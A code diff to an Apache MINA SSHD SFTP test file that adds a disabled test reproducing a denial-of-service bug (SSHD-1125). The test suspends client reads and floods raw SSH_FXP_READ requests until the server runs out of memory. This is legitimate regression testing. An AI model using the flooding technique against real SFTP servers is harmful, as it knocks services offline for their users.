@@ -30,15 +30,29 @@ import java.nio.file.StandardOpenOption;
 import java.util.Date;
 import java.util.EnumSet;
 
+import org.apache.sshd.common.Factory;
+import org.apache.sshd.common.io.IoSession;
+import org.apache.sshd.common.io.nio2.Nio2Session;
+import org.apache.sshd.common.random.Random;
+import org.apache.sshd.common.session.Session;
+import org.apache.sshd.common.util.buffer.Buffer;
+import org.apache.sshd.common.util.buffer.ByteArrayBuffer;
+import org.apache.sshd.mina.MinaSession;
 import org.apache.sshd.sftp.SftpModuleProperties;
 import org.apache.sshd.sftp.client.AbstractSftpClientTestSupport;
+import org.apache.sshd.sftp.client.RawSftpClient;
 import org.apache.sshd.sftp.client.SftpClient;
+import org.apache.sshd.sftp.client.SftpClient.CloseableHandle;
+import org.apache.sshd.sftp.client.SftpClient.OpenMode;
 import org.apache.sshd.sftp.common.SftpConstants;
 import org.apache.sshd.util.test.CommonTestSupportUtils;
 import org.junit.Before;
 import org.junit.FixMethodOrder;
+import org.junit.Ignore;
 import org.junit.Test;
 import org.junit.runners.MethodSorters;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 /**
  * @author <a href="mailto:dev@mina.apache.org">Apache MINA SSHD Project</a>
@@ -194,5 +208,72 @@ public class SftpRemotePathChannelTest extends AbstractSftpClientTestSupport {
         byte[] actual = Files.readAllBytes(dstFile);
         assertEquals("Mismatched transfered size", expected.length, actual.length);
         assertArrayEquals("Mismatched transferred data", expected, actual);
+    }
+
+    /*
+     * Demonstrates an DoS vulnerability by opening a file and requesting data from it without actually reading
+     * any response data, the buffers in {@link org.apache.sshd.common.channel.BufferedIoOutputStream} fill up until
+     * an Out Of Memory Error occurs.
+     * To test, the available heap memory of the server must be below the value set in requested_data_volume
+     * limit the available heap memory of the junit execution by passing "-Xmx256m" to the VM.
+     */
+    @Test(timeout = 5L * 60L * 1000L)   // see SSHD-1125
+    @Ignore("Used only for debugging SSHD-1125")
+    public void testReadRequestsOutOfMemory() throws Exception {
+        Path targetPath = detectTargetFolder();
+        Path parentPath = targetPath.getParent();
+        Path lclSftp = CommonTestSupportUtils.resolve(
+                targetPath, SftpConstants.SFTP_SUBSYSTEM_NAME,
+                getClass().getSimpleName(), getCurrentTestName());
+
+        // Generate some random data file
+        Path testFile = assertHierarchyTargetFolderExists(lclSftp).resolve("file.txt");
+        byte[] expected = new byte[1024];
+        Factory<? extends Random> factory = sshd.getRandomFactory();
+        Random rnd = factory.create();
+        rnd.fill(expected);
+        Files.write(testFile, expected);
+
+        String file = CommonTestSupportUtils.resolveRelativeRemotePath(parentPath, testFile);
+        try (SftpClient sftp = createSingleSessionClient();
+             CloseableHandle handle = sftp.open(file, OpenMode.Read)) {
+            // Prevent the client from reading any packets from the server to provoke serverside buffers to fill up
+            Session session = sftp.getSession();
+            IoSession ioSession = session.getIoSession();
+            if (ioSession instanceof MinaSession) {
+                org.apache.mina.core.session.IoSession minaSession = ((MinaSession) ioSession).getSession();
+                minaSession.suspendRead();
+            } else {
+                ((Nio2Session) ioSession).suspendRead();
+            }
+
+            // Always read from the same offset. Thereby one can work with a small file.
+            long curPos = 0L;
+            byte[] buffer = new byte[32768];
+            long readLength = buffer.length;
+            // Request about 1 GB of data
+            int requestedDataVolume = 1024 * 1024 * 1204;
+            byte[] id = handle.getIdentifier();
+            Runtime runtime = Runtime.getRuntime();
+            Logger logger = LoggerFactory.getLogger(getClass());
+            String testName = getCurrentTestName();
+            long maxRequests = requestedDataVolume / readLength;
+            for (long i = 0L; i < maxRequests; i++) {
+                if ((i & 0x03FF) == 0L) {
+                    logger.info("{} - free={}, total={}, max={} after {}/{} requests",
+                            testName, runtime.freeMemory(), runtime.totalMemory(), runtime.maxMemory(), i, maxRequests);
+                }
+
+                // Send a SSH_FXP_READ command to the server without reading the response
+                Buffer requestBuffer = new ByteArrayBuffer(id.length + Long.SIZE, false);
+                requestBuffer.putBytes(id);
+                requestBuffer.putLong(curPos);
+                requestBuffer.putInt(readLength);
+                ((RawSftpClient) sftp).send(SftpConstants.SSH_FXP_READ, requestBuffer);
+
+                Thread.sleep(1L);
+            }
+            Thread.sleep(1000L);
+        }
     }
 }
